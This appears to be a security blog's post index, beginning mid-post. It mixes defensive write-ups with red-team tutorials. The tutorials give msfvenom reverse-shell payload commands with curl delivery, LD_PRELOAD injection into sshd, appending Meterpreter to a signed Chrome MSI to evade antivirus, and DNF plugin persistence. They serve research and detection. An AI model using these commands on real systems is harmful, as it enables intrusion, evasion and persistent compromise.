colleague asked me a question today about the relationship between Qbot and a Windows system utility: esentutl.exe. It’s been sparsely documented via tweet, and I want to more fully explain why Qbot jumped into using the utility during operations.The WebCacheQbot is a banking trojan, so its operators are naturally interested in obtaining data from victim hosts. The data includes internet browsing history, files opened, and much more. This data now lives within the WebCacheV01.dat database. In modern versions of Internet Explorer, the database uses the Microsoft Extensible Storage Engine (ESE) database format, the format famous for Exchange and Active Directory databases. As with other transactional databases, the WebCache may have multiple entries in a transaction log that get applied to the database file over time as the system allows write operations to the database. This helps improve resilience of the database and allows recoveries/rollbacks. This is where esentutl.exe becomes useful.Flushing the DataQbot borrowed a trick from digital forensic examiners to get victim internet history data. As documented by SANS and others, an examiner could get data from the WebCacheV01.dat file, but it would be incomplete as multiple log files may exist. This places the database in a “dirty” state. To get a complete, “clean” copy of the database, the examiner should first execute a recovery with esentutl.exe.So Qbot uses a command like this:esentutl.exe /r V01 /l&quot;C:\\Users\\[REDACTED]\\AppData\\Local\\Microsoft\\Windows\\WebCache&quot; /s&quot;C:\\Users\\[REDACTED]\\AppData\\Local\\Microsoft\\Windows\\WebCache&quot; /d&quot;C:\\Users\\[REDACTED]\\AppData\\Local\\Microsoft\\Windows\\WebCache&quot;In the command, /r V01 indicates esentutl.exe will execute a recovery operation using the database log file V01. The /l specifies the location of log files, the /s specifies the location of system files (including a checkpoint file), and the /d specifies the location of database files. All the relevant files live in the same folder, leading to the same path appearing three times in the command. After this command executes, the data from the WebCache database log files is flushed into the WebCacheV01.dat database and Qbot can pick that file up for later use.esentutl Reference" }, { "title": "Linux EDR Evasion With Meterpreter and LD_PRELOAD", "url": "/linux-edr-evasion-meterpreter-ld-preload/", "categories": "red-team, linux, security", "tags": "ld_preload, linux, edr, evasion, meterpreter", "date": "2020-02-06 00:00:00 +0000", "snippet": "Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it’s pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I’ll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.The SetupTo get started, I’m working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim. You don’t have to limit yourself to this setup, but it’s what works for me at the moment.On the victim system, the only access needed is code execution and the ability to transfer a payload.On my attacker machine, I need to generate a Meterpeter payload within a shared object library format. To do this, we can use msfvenom.# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.57 LPORT=2022 -f elf-so &amp;gt; meterpreter.soNext, we need a way to transfer meterpreter.so to the victim system. This may be done via a curl command or another method of downloading/uploading files.In my case, I used NGINX to host the SO library from my Kali machine for download:# cp meterpreter.so /var/www/html/# systemctl start nginxFinally, we need to set up a handler to receive the connection and use it in Metasploit. To do this, we can work with msfconsole.# msfconsole# msf5 &amp;gt; use exploit/multi/handler# msf5 &amp;gt; set payload linux/x64/meterpreter/reverse_tcp# msf5 &amp;gt; set LHOST 10.10.10.57# msf5 &amp;gt; set LPORT 2022# msf5 &amp;gt; run[*] Started reverse TCP handler on 10.10.10.57:2022And now we move to our victim system for execution!The ExecutionOn my victim system, I downloaded the SO library using a simple curl command:$ curl -O http://10.10.10.57/meterpreter.soFrom here I can pick any process I want to attribute execution to, as long as it isn’t statically compiled. In this case, I’m choosing sshd since it often makes network connections and because some network admins use tcp/2022 to obscure their SSH service availability.$ LD_PRELOAD=./meterpreter.so sshdOnce executed, control is never actually passed to sshd, and the process execution is controlled by meterpreter.so as it reports back for commands. It appears that the process is frozen, but it really isn’t.On the Kali machine I see:[*] Sending stage (3021284 bytes) to 10.10.10.51[*] Meterpreter session 1 opened (10.10.10.57:2022 -&amp;gt; 10.10.10.51:39314) at 2020-02-06 20:05:00 -0600From Kali I can join the Meterpreter session and get access at the permission level of the victim’s user account:meterpreter &amp;gt; sysinfoComputer : cent8-01.westeros.localOS : CentOS 8.0.1905 (Linux 4.18.0-80.el8.x86_64)Architecture : x64BuildTuple : x86_64-linux-muslMeterpreter : x64/linuxIf we go to investigate with an EDR product, Auditd/Auditbeats logs, or osquery, the network connection and any actions will be attributed to sshd. This requires a defender to be much sharper on their game to spot malicious activity and understand the behavior of system processes. Depending on the actions we want to perform and the ports available for C2, we could potentially do the same with httpd, smtpd, vsftpd, etc.How Does It Work?Most of the time we can safely assume that SO libraries work in a similar fashion to DLLs on Windows. That is, the library must have an exported symbol that should be called for code to execute. We can inspect SO libraries for exported symbols using the nm command. Howver, when we inspect our generated meterpreter.so library we can notice something odd:# nm -D meterpreter.sonm: meterpreter.so: no symbolsOddly enough, it doesn’t look like our meterpreter.so has any symbols to call, so how did sshd know to execute the code within the SO library? This is because of a feature of the ELF binary format.SO libraries follow the ELF binary format and include a section called .init. Any code placed within this section will execute when the library is loaded by a process and before control is passed to the process itself. The section is usually used by compilers for global constructors, but we can put nearly anything there for exploitation. When msfvenom creates its elf-so payloads, it embeds payloads within a template designed to house the payload within the .init section for execution. That way, no process should need knowledge of symbols within the library for execution.This is also the way payloads generated/used by the Zombie Ant Farm project work.The use of a .init section also has an interesting limitation when combined with preloading- it can only be used effectively when you define LD_PRELOAD for a single process. When executing Meterpreter in this fashion, the victim process will appear hung. This is because the Meterpreter code continuously executes before control is passed to the victim process’s main function. The rest of the process instructions will not execute until Meterpreter exits. This means that if you export LD_PRELOAD to leverage this SO library or write the library path into ld.so.preload, it will cause serious instability. If you use a preload method that causes meterpreter.so to load into numerous or all processes, it will cause loads of processes, even ones needed for system operation, to hang immediately after loading the SO library. So, no bueno.Is It Useful?Eh, it depends. We obviously already need code execution and a method of downloading code to a victim for this to be possible. I could see this being useful when combined with an RCE against publicly-available services to get a stable shell. That said, a simpler and safer route in terms of stability could also be the execution of a Python C2 agent. In the case of a Python agent, it would be slightly harder to cause the attribution of activity to a system process. This is not going to be an initial access method, it would be more useful for long-term evasion and persistence when combined with a .bash_profile or .bashrc command execution." }, { "title": "Exploiting Yum and DNF Plugins for Persistence", "url": "/exploiting-yum-dnf-plugins-persistence/", "categories": "red-team, Linux", "tags": "DNF, Yum, Linux, Plugin, Persistence", "date": "2020-01-13 00:00:00 +0000", "snippet": "Two Metasploit Framework modules have held my interest in the last few weeks: the ones for persistence using Linux package managers apt and Yum. While they require root privileges to exploit, they provide a novel persistence mechanism that is likely overlooked by defenders. While looking at these modules I noticed that persistence using DNF wasn’t included, and I set off to find a way to persist on Linux systems using DNF plugins.What’s a Package Manager, anyway?On Windows systems most folks download applications from sites on the Internet or install them from media such as CDs or DVDs. This proves to be a major threat to the stability and security of Windows as it lets users download and install unpredictable software. On the other side of the spectrum, it allows users to find and use software to improve their world.For Linux distributions, the software installation model looks different. You can still download software from the Internet, but it is not usually distributed in binary form for Linux systems. In these cases, you’d need to download the source code from a trusted mirror, compile it, and resolve any dependencies needed to make the software work. This is unfriendly for inexperienced users and can cause misconfiguration. As systems developed, a more friendly form of software distribution evolved: packages. Packages became an easy way to distribute compiled binaries for specific Linux distro versions and the software that managed packages helped administrators automate dependency resolution and configuration.Now, most Linux distributions have a package manager and consume one of a few package types. The most common are RPM Package Manager (RPM) and Debian (DEB) packages. RPM packages work with systems that derive from Red Hat Enterprise Linux. These include RHEL itself, CentOS, and Fedora. DEB packages work with systems that derive from Debian Linux. These include Debian, Ubuntu, Mint, ElementaryOS, and others.On the RPM side, administrators used the Yum command to interact with packages prior to RHEL/CentOS 8 and Fedora 22. After those builds, administrators began to use the dnf command. On the DEB side, administrators typically use the apt or apt-get commands to interact with packages. As these package managers became more complex, they included plugins or additional functionality to make package installation more extensible. A good example of this in Yum is the fastestmirror plugin that measures the speed of interaction with one or more update mirrors and helps Yum pick the fastest one.For the rest of this post we will focus on Yum and DNF plugins. Some of this functionality also exists in apt, but that’s a story for another day.Foundational Yum and DNF Plugin KnowledgeYum and DNF are both written in Python and handle all the operations around package installation. From the terminal you’ll run commands such as this:/usr/bin/dnf install httpd/usr/bin/yum updateSince these tools are implemented in Python, their plugins are also Python.YumWith Yum, we need a few things for plugin execution. First, plugins must be enabled in /etc/yum.conf. This is done with the line plugins=1. Next, one or more plugin configurations present in the /etc/yum/pluginconf.d directory must be enabled with a line enabled=1. Finally, the Python plugin code itself lives in the /usr/lib/yum-plugins directory. When writing the plugin, the developer can set hook functions that will execute when Yum executes specific triggers.As it so happens, the fastestmirror plugin is always used by yum in its default state. An easy way to exploit this is to plant malicious code within /usr/lib/yum-plugins/fastestmirror.py. This requires root privileges and will cause the malicious code to run as root every time Yum executes for installations or updates.DNFWith DNF, the configuration and code paths change but most of the concepts stay the same. First, DNF configurations exist in /etc/dnf/dnf.conf. Plugins are enabled by default and are only disabled if a line similar to plugins=False is present. Next, plugin configurations exist in the /etc/dnf/plugins directory. Finally, the actual plugin code lives under the /usr/lib/python3.6/site-packages/dnf-plugins directory, but the path will change as Python versions change.In DNF, we can target one specific plugin for persistence: generate_completion_cache.py. This plugin executes whenever an administrator runs dnf install or dnf update to speed up shell completion. It is distributed by default across Fedora, CentOS, and RHEL distributions. There doesn’t appear to be a specific configuration file that disables the plugin itself. Even in the dnf-plugins-core documentation, the plugin appears intended to always run in the background without user interaction. This is perfect for exploitation. To show, we can use vim to change the plugin code.Change /usr/lib/python3.6/site-packages/dnf-plugins/generate_completion_cache.py to add the following code above import os.path:import osos.system(‘touch /etc/root-marker’)This will give us proof that the plugin executed as root and wrote a file to disk.Next, execute these commands (as root):dnf updatels -l /etc/root-markerIf /etc/root-marker exists, you have a successful execution.Detection and BreakageI haven’t dived too far into detection for this technique. Process monitoring will show the code you add as spawning from an instance of python with the command line showing dnf update or a similar command. You may find luck monitoring for different exec system calls that spawn shell processes, scripts, or other utilities. Any Python code you add that does not spawn an external command will execute within the dnf python instance itself. This will blend in with surrounding update activity.This technique will probably break with package updates to dnf-plugins-core. In addition, you can revert the plugin file by reverting the added code.Why not just change DNF itself?You can probably do that, I just zoomed in on the plugins for execution. If you want to modify DNF for persistence, you probably can.Is it useful?It depends. This technique requires root/sudo privileges to use. The technique assumes you’re attempting to persist on a system that you’ve found either misconfigured or susceptible to privilege escalation. This path should not be your first stop for persistence if you only have user privileges." }, { "title": "When Local Password Resets Aren&#39;t Local", "url": "/when-local-password-resets-arent-local/", "categories": "blue-team, windows, security", "tags": "windows, active-directory, domain-controllers, accounts, administrators", "date": "2020-01-09 00:00:00 +0000", "snippet": "When You Reset a Domain Administrator Instead of LocalDuring an IR engagement, one of my colleagues identified malicious activity where an adversary reset the password for a local administrator account. While this reset would gain the adversary access to the local administrator account, it might not have warranted an emergency. That is, until we noticed that the password reset occurred on a domain controller.Are There Local Accounts on Domain Controllers?Well, that gets complicated. Security pros and IT generalists are usually aware of SAM account databases on Windows systems. These databases contain the credentials needed for user logons when no domain connections are present. In the absence of Active Directory, such as in workgroup or home network scenarios, the Windows systems will use the SAM account database to authenticate users. In some cases, users may also choose to logon with a local account in enterprise environments, authenticating from the SAM database instead of the domain controller.Most Windows systems follow this same pattern, unless they are promoted to Active Directory domain controllers. Once this happens, the promoted DC will stop using the local SAM database for its own everyday authentication, instead it uses the Active Directory database stored in NTDS.dit. In addition, the “local” groups for the DC will be defined by the AD Built-In groups. If the DC is the first of a domain, the contents of the SAM account database are migrated into the new domain’s NTDS.dit database. If the DC is an addition to an existing domain, it will receive a replica of the NTDS.dit database to authenticate from.During the promotion of a domain controller you may also notice that the process requires you to set a Directory Services Restore Mode password. Once you have promoted the domain controller this account will be the only one stored within the local SAM database and it will not be available for use unless you boot into DSRM mode on the DC for recovery.Does This Really Matter?It absolutely matters when investigating password resets and assigning permissions within an Active Directory domain.Consider these commands:net user Administrator Password123If this command executes on a non-domain controller system, it will reset the local Administrator account’s password (in the SAM database) to Password123. On a domain controller, it will reset the domain’s Administrator account in NTDS.dit instead. This implies that whoever resets this password will have Administrator access for the entire Active Directory domain and all systems therein rather than just a single system.This also implies that any malware that achieves use of the SYSTEM account on a domain controller will be able to escalate to domain privileges as the SYSTEM account will be able to reset user account passwords on the DC.net user JoffreyIf this command executes on a non-DC system, it will add a local user by the name of Joffrey to the SAM database. On a DC, it will add a domain user by the same name to NTDS.dit. This is important because performing this action on a DC may circumvent your account creation processes unintentionally.net localgroup Administrators /add WESTEROS\\Jorah.MormontIf this command executes on a non-DC system it will add Jorah’s account to the local Administrators group, entitling him to manage a single computer system. If the command executes on a DC system, Jorah’s account will be added to the Built-In Administrators group in Active Directory. This would entitle Jorah to make changes to Active Directory’s NTDS.dit database, Group Policy Objects, AD Sites, and also allow administrative access on all computers across the domain. This can get very bad very quickly.Taking ActionBe vigilent when performing operations on accounts from a domain controller’s command line. Remember that your “local” changes likely aren’t local if they occur on a DC.Sources Technet Microsoft" }, { "title": "Whitelisting LD_PRELOAD for Fun and No Profit", "url": "/whitelisting-ld-preload-for-fun-and-no-profit/", "categories": "blue-team, linux, security", "tags": "ld_preload, linux, whitelisting, unix, ld_audit, libpreloadvaccine", "date": "2019-08-29 00:00:00 +0000", "snippet": "If you’ve been around the Linux/BSD/Solaris/Other UNIX ecosystem for a while you’ve probably heard of the fabled LD_PRELOAD trick. If you haven’t heard of it, let me introduce you to one of the longest-held, dirty security issues in UNIX…A Brief Look at LD_PRELOADLD_PRELOAD is an environment variable used by the dynamic linker on UNIX-based systems. Normally the dynamic linker follows a specified search pattern to load various dynamic libraries (shared objects on UNIX). Libraries specified using the LD_PRELOAD variable are loaded before the ones typically required by whatever command you’ll execute. It also goes one step further, libraries specified in LD_PRELOAD are loaded by commands even if their executables don’t require the preloaded binaries for operation.This is an insanely easy way to introduce malicious code to a system. Preloaded libraries allow an adversary some extra advantages. First, an adversary has the ability to hook system calls or library calls. In at least one project, libprocesshider, this functionality is leveraged to taint the contents of a directory listing to hide processes. It doesn’t stop there, either. As shown in the Zombie Ant Farm project, adversaries don’t need specific information about the internals of binaries to execute their evil code. In the case of the ZAF project, it’s shown that adversaries can implement functions that execute at the load or unload of preloaded binaries. This means that adversaries can execute code by simply specifying a library is a preload and waiting for a legitimate user to execute something.This functionality is implemented by the the dynamic linker (rtld.c source file for the geeks out there). It’s been an issue in Linux systems specifically for at least 20 years, longer in UNIX as a whole. To make matters a bit worse, this can play havoc with security tooling. First off, security tools aren’t always aware of environment variables. In the case of endpoint detection and response (EDR) tooling, environment variables aren’t even visible most of the time. In other cases, security tools may even become victims of LD_PRELOAD if they aren’t statically linked with code they need to execute.Oh, and adversaries with root privileges can make preloads load in any process on a system by creating the file /etc/ld.so.preload and specifying the path of their preload library within. When done properly, adversaries can persist and evade defenses indefinitely on a system using this technique.By the way, there’s not really an easy way to disable LD_PRELOAD - https://security.stackexchange.com/questions/63599/is-there-any-way-to-block-ld-preload-and-ld-library-path-on-linux.There are some useful abilities to LD_PRELOAD, though. It’s sometimes handy to hook functions that already exist in various applications or libraries to test or debug code. From what I can tell, this and performance monitoring are pretty much the only legitimate uses of it. Even the source and manpages say preloading shouldn’t be used long-term.Auditing Preload LibrariesDuring my day job at Red Canary, I’ve spent a lot of time diving into Linux threats of various forms. LD_PRELOAD kept showing up in the form of userspace rootkits. Azazel, HiddenWasp/Winnti/Highnoon.Linux, nation-state malware, and other threats have used LD_PRELOAD to evade defenders and persist within systems. I became really disconcerted at the lack of visibility around this threat. The closest bit of visibility I could find was implemented in osquery (Alienvault, Palantir) and with select hunts using shell commands.And then I read the manpage for rtld-audit- http://man7.org/linux/man-pages/man7/rtld-audit.7.html.It turns out there’s an audit API exposed by the dynamic linker that may be leveraged by libraries specified in another environment variable- LD_AUDIT. In my spare time, I initially dove into this API exploring a function named la_preinit() which lets an audit library take actions after all libraries have been loaded but before control is passed to the executable. My hope was to implement visibility folks could use by logging preloads that have been mapped to syslog. I started out with Golang and then Rust, but neither language would compile properly for an LD_AUDIT library (although they can be used with LD_PRELOAD).So I started learning C and test-driven development. Around this time I read the manpage for rtld-audit in more depth, noting one particular function- la_objsearch(). When the dynamic linker loads libraries for execution, it has to reconcile libraries requested by an ELF binary and find them on disk. When the linker searches for a particular library, it triggers the la_objsearch() function. The function typically returns the name a linker should use to further search for a library.Then I read this line- “If NULL is returned, then this pathname is ignored for further processing.”Could it be that simple? I set off to start another project around whitelisting LD_PRELOAD binaries with a simple design. I wanted to implement la_objsearch(), check each library loaded against the known lists of preloads (environment variable and ld.so.preload) and then return NULL for each preload that wasn’t also included in a known-good list. I was shocked to discover that this approach actually worked!Introducing libpreloadvaccine!The result of this research and project is libpreloadvaccine. This tool is designed to load with every process execution, checking library loads against preload lists. If a preload search is attempted and isn’t allowed, libpreloadvaccine instructs the dynamic linker to ignore the preload. This hinders the successful execution of libraries using LD_PRELOAD.Admittedly, this is the first version of the tool and it likely needs a bit extra work. Definitely test this before putting into production in your server farms! I’d love to see this functionality built into the dynamic linker itself, making this tool redundant. Until then, this is designed to help shore up systems against the LD_PRELOAD threat. I’m offering libpreloadvaccine to the public as open source code with a MIT License. Go forth and make the world a better place using it where you can!Here it is in action against a module from Merlin:Installing libpreloadvaccineTo install libpreloadvaccine, first build it for your system by running make build. Copy the compiled shared object into the preferred library folder of your system. Then export the environment variable LD_AUDIT defining the path of your libpreloadvaccine library.To make it persistent, add a line like this to your /etc/profile file:export LD_AUDIT=&amp;lt;path to libpreloadvaccine&amp;gt;If you want to whitelist preloads, create a space-delimited list at /etc/libpreloadvaccine.allow. Preload paths found in this list will be allowed for execution.Go forth and be excellent!" }, { "title": "Adding Process Hiding to Merlin", "url": "/adding-process-hiding-to-merlin/", "categories": "security, red-team, linux", "tags": "merlin, ld_preload, libprocesshider", "date": "2019-08-28 00:00:00 +0000", "snippet": "Sometimes red team tools need a little bit of extra love to address certain platforms. As I researched Merlin for detection strategies on the blue team side, I noticed that it could use some extra functionality to help replicate what we see in the real world for Linux compromises.One particular technique that fascinated me was the combination of LD_PRELOAD with libprocesshider to gain a little bit of rootkit functionality and hide processes from casual observers. This technique has been used in the wild by Rocke and Pancha Group during cryptojacking campaigns.Once I looked through the extensible module functionality in Merlin, I realized we could fairly easily download, compile, and load libprocesshider as a shared object using /etc/ld.so.preload as long as the Merlin agent has root privileges. With the default module options, the module will hide the Merlin agent itself from observation. If you modify the options, you can choose to hide other processes executing on the system.Detection NotesThis wouldn’t be complete without some notes for the blue team for detection! There are a easy search/hunt you can use to find this activity- look for the modification of /etc/ld.so.preload. This file isn’t commonly modified outside security or performance monitoring applications." }, { "title": "Making Meterpreter Look Google Signed", "url": "/making-meterpreter-look-google-signed/", "categories": "security, red-team", "tags": "meterpreter, chrome, msfvenom, jar, metasploit", "date": "2019-01-18 00:00:00 +0000", "snippet": "In this post I’ll use some of the information made public by VirusTotal in a recent blog post and show how you can easily create a Metasploit Meterpreter payload and append it to a signed MSI file. This will allow you to leverage the code signing from the MSI file to make your payload appear legitimately signed by Google, Inc. After I’ll cover a bit of discussion on why this technique is dangerously significant and how to investigate for its use.We need a few prerequisites to start- Msfvenom A Google Chrome Enterprise MSI installer file A handler to listen for your Meterpreter sessionTo start, we need a Meterpreter payload in Java Archive (JAR) form. We can get this using msfvenom:msfvenom -p java/meterpreter/reverse_https LHOST=&amp;lt;metasploit host&amp;gt; -f jar -o meterpreter-https.jarThis will output a JAR file containing the Java Meterpreter payload establishing a reverse shell over HTTPS. The payload provides us encryption to obscure commands while blending in with other HTTPS traffic. Feel free to leave the default port option, 8443, unchanged in this example. If we examine this generated payload with VirusTotal, we can see it’s definitely malicious and not signed in any way.https://www.virustotal.com/#/file/28ccdc1cbfe54b185b8b5ba973f672cc7ac9a52a5e034dbaab2c42a4f1e05fd2/detailsWhile here, go ahead and configure a handler to receive your Meterpreter session. In the Metasploit console, execute:handler -p java/meterpreter/reverse_https -H 0.0.0.0 -P 8443Now we can use a Windows command prompt (cmd.exe) and the copy command to append our JAR file to an existing, signed MSI file. If you insist on using Linux or macOS to stage the payload, you can probably do the same append using DD. For this exercise I chose a Google Chrome Enterprise MSI installer file.copy /b GoogleChromeStandaloneEnterprise64.msi + meterpreter-https.jar GoogleChromeStandaloneEnterprise64.jarThis action performs a binary file copy, combining the MSI and JAR files together to create a new JAR file.Now that the file exists, right-click and examine the file’s properties:If we examine the file’s properties with VirusTotal, we can see the digital signature still exists, but it’s not valid according to VT’s tools. As a bonus, the file is detected by far fewer AV technologies than just the raw, non-appended payload.https://www.virustotal.com/#/file/4937f7b7fbece98a3e95d94e67d56bbba6b8a28c0c9b678d0f605a9ba55acaae/detailsNow we can actually execute the payload by double-clicking. Assuming everything has gone correctly, Meterpreter will execute within Java and connect back to your handler.From here you can move about the host with the privileges of whatever user executed the payload.At the end of this path, you’ve generated a Meterpreter payload that isn’t signed itself but appears to be signed thanks to a quirk introduced by interactions between MSI and JAR files.How Is This Possible?This trick is possible due to an issue with the MSI file format disclosed by VirusTotal in this blog post. MSI files are compound storage files that resemble databases comprised of OLE streams. This means that the content of an MSI is not truly altered when appending data to the file. The OLE streams still exist within the file, and appended data exists outside those streams. Unfortunately, DFIR professionals are conditioned to playing by code signing rules for portable executables (PEs). In these cases, code signing is a method of ensuring executable code integrity from the publisher to the consumer. Changes to the PE file will cause a mismatch and invalidate the signing data. In the case of an MSI file, appending may not harm the original file’s integrity, so the signing information is still valid. The appended payload remains a stowaway.When the file retains a MSI extension, it will open using Windows Installer/msiexec.exe. When the file gains a JAR extension, it will open with Java given its file association. When you inspect the file’s properties, the magic number/header bytes for the file identify it as a OLE Compound File, allowing tools to parse data within and read the digital signature.But how can Java execute a MSI file? Even if it’s renamed? That’s the beautiful part of this technique! JAR files are glorified ZIP archive files. It turns out that Java and other tools that read ZIP data will read the data from the last bytes of a file toward the first, until it encounters ZIP header bytes. In this technique, the ZIP header will occur before the MSI content. So the original MSI is not processed by Java.Why Is This Significant?This is significant because it challenges how we think about digital signatures and code signing. We’ve been conditioned to think a change to a file automatically invalidates a code signature. Instead we need to take into account the variable of individual file format. What matters is the integrity of signature-guaranteed content. We need to recognize that some file changes do not trespass into the guaranteed content. Thus, no integrity is violated.This also presents another question- Can we reorient software and security controls to recognize when a file should not be associated with appended content? Some investigators and security tools use digital signatures to shortcut decisions on the legitimacy of software. Instead, signatures should be corroborating evidence in the legitimacy decision.In addition, this technique shows us that traditional code signing is not the only way to generate a signed malicious payload. You can sit your payload next to something already signed if the file format allows.What value does this give adversaries? I think the technique is best suited for payload delivery. Yes, an adversary may compress files for exfiltration into a ZIP archive and append it to a MSI file to bypass data loss protection controls. I don’t think that value significantly outstrips the use of packing and encryption to hide data in an obfuscated form for exfil.Detecting and InvestigatingDetecting an appended payload during execution will likely be difficult. Endpoint detection and response tools will observe Java executing the payload, but will not show signature data of the payload itself. Behavioral detection will rely on the payload resembling traits of Java malware. AV technology will recognize file types, but depending on configurations and specifics may not recognize the appended payload. The best way to detect this? Look for Java executing JARs from user-writable folders with suspicious network connections and establishing persistence mechanisms.Investigating appended payloads is light work with Sysinternals SigCheck after version 2.70. This tool will validate the MSI’s digital signature and flag when appended content is present. This functionality has also been added to VirusTotal. If you want to get the original appended payload and separate it from the MSI, you can use a hex editor and cut/paste bytes after the ZIP header into a new file." }, { "title": "My SANS DFIR NetWars Experience", "url": "/my-sans-dfir-netwars-experience/", "categories": "Education", "tags": "SANS, DFIR, NetWars", "date": "2018-08-26 00:00:00 +0000", "snippet": "At SANSFIRE 2018 in Washington, DC I had the awesome opportunity to compete in SANS DFIR NetWars with a coworker from Red Canary. This was my first experience with NetWars, and I wasn’t sure what to expect with the tournament. We heard that at SANSFIRE DFIR NetWars would allow team competition this time around, which is different from the previous individual-only competition. I went to a SANS@Night session titled “Intro to NetWars” given by Tim Medin of Red Siege Infosec fame with my coworker and our experience soon turned into a recruiting effort. We realized that we could perform Windows disk and memory forensics fairly well alongside network forensics, but neither of us could work well with smartphone, Apple forensics, or malware analysis beyond running simple static analysis tools. That said, we met a couple of awesome folks willing to team up with us for the tournament at the session.On the Thursday night of SANSFIRE, NetWars started. The rules were simple: Don’t be a jerk to each other or the tournament hosts Use any tool for which you have a legal license (even if its proprietary to your company)Individuals and teams of up to five were allowed to compete, and everyone was given the same evidence and questions. The evidence was distributed on USB drives the same as SANS DFIR classes, with a wide variety of evidence types. Evidence files contained Windows NTFS images, Apple HFS/APFS images, memory dumps, PCAPs, logs, malware binaries, and smartphone acquisitions. If you don’t bring any tools with you, SANS gives you a SIFT workstation VM to import into VMware Player or Workstation and all the bare minimum tools you need to answer questions. For the best experience, you’ll also need a Windows host or virtual machine. I opted for a virtual machine as I use Linux on my personal laptop. This gave me a couple of issues performance-wise and when attempting to read the evidence from USB. All the USB drives were formatted exFAT, so I had to install a couple packages to support the filesystem.For the questions, all questions wre presented in a CTF-style portal and resembled something similar to “For the evidence file X, what was the created timestamp of Y file in UTC?”. The questions obviously differed a bit for memory dumps, malware analysis, and network evidence, but they all required the input of some unique information that couldn’t be easily brute-forced. The tournament is designed to have 4 tiers, each level unlocking once you answer the minimal number of questions within the previous level. The questions also become more difficult as levels progress. Once you reach levels 3–4 you’ll discover that answering a single question will require multiple steps of work. For example, one question might require correlating artifacts of execution like prefetch and shim cache entries to determine times of program execution.For the scoring, questions are worth a different amount for each level, increasing as the difficulty increases. If you answer a question incorrectly, points will be deducted from you or your team for the first two incorrect attempts. After those attempts you won’t lose any more for incorrect answers but the SANS faculty will call you out on attempting to brute-force answers. For each question there are a few hints. These hints cost you nothing and only count as a scoring mechanism in the event of a tie. If your team ties with another, the winner is decided by who used the least hints. Do not let this stop you from using hints! Each hint will help you get closer to answering the question and may even suggest tooling to assist you. If you ask SANS faculty for help during NetWars, you will be steered into hints first.If you’re playing against veteran NetWars players, you might notice that some of their scores jump quickly early in the tournament. This is because some folks try to cheat the system a bit and save answers from their previous NetWars participation. DFIR tries to mitigate against this somewhat by rotating questions around test-bank style. Still, some players will likely have some answers saved by not all of them. In addition, you’ll notice scores jumping quickly on the second night of NetWars as many players save a copy of available questions and work on them during class on Friday. The SANS faculty are also aware of this and made notice of people working during class. By the second day, my team had already recognized we had deficiencies on the Apple forensics side, so I made another recruiting effort to find some help. That worked out well for us and we finished in second place, losing to a group of professional examiners from Stroz Friedberg. Keep in mind that you’ll be competing against some people that are DFIR pros, but don’t get discouraged.Tips for winning: On a team, recruit wisely. Look for people in each discipline or at least in each of the DFIR classes Bring a Windows host with VMware Player/Workstation or have a Windows VM ready Become familiar with SIFT Workstation Use hints liberally, it’s better to use all hints and get right answers than use none with many wrong answersTips for learning: It’s ok not to win, aim to get better than you are Ask questions of your teammates Use all your hints and be willing to ask questions of faculty and other teams Be willing to answer questions for those less knowledgeable" } ]
